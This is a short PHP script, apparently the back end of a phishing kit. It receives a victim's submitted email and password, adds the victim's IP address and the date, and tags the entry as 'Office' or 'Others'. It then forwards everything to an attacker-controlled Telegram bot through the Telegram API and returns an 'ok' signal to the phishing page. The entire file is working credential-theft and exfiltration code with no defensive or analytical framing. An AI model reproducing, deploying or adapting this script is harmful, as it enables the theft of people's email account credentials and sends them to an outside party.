<?php


 $log = $_POST['u'];
 $pass= $_POST['p'];
 $token = $_POST['makin'];
 $chat_id = $_POST['chatid'];
 $regtype= $_POST['signup'];
 $ip = getenv("REMOTE_ADDR");
 $date = date("D/M/d, Y g:i a");


 $msgoff = "Email: $log%0APass: $pass%0AIP address: $ip%0ASubmitted on $date %0A--------Office---------";

 $msgoth = "Email: $log%0APass: $pass%0AIP address: $ip%0ASubmitted on $date %0A--------Others---------";

if ($regtype==="office"){
 $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$msgoff";
}
else{
  $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$msgoth";
}

if(!empty($chat_id)){

 $opts = array(
  'http'=>array(
    'method'=>"GET",
    'header'=>"Accept-language: en\r\n" .
              "Cookie: foo=bar\r\n"
  )
);

$context = stream_context_create($opts);
$fp = fopen($url, 'r', false, $context);
fclose($fp);
echo json_encode(array('signal'=>'ok'));


}
else{
 http_response_code(403);
die('Forbidden');
}

?>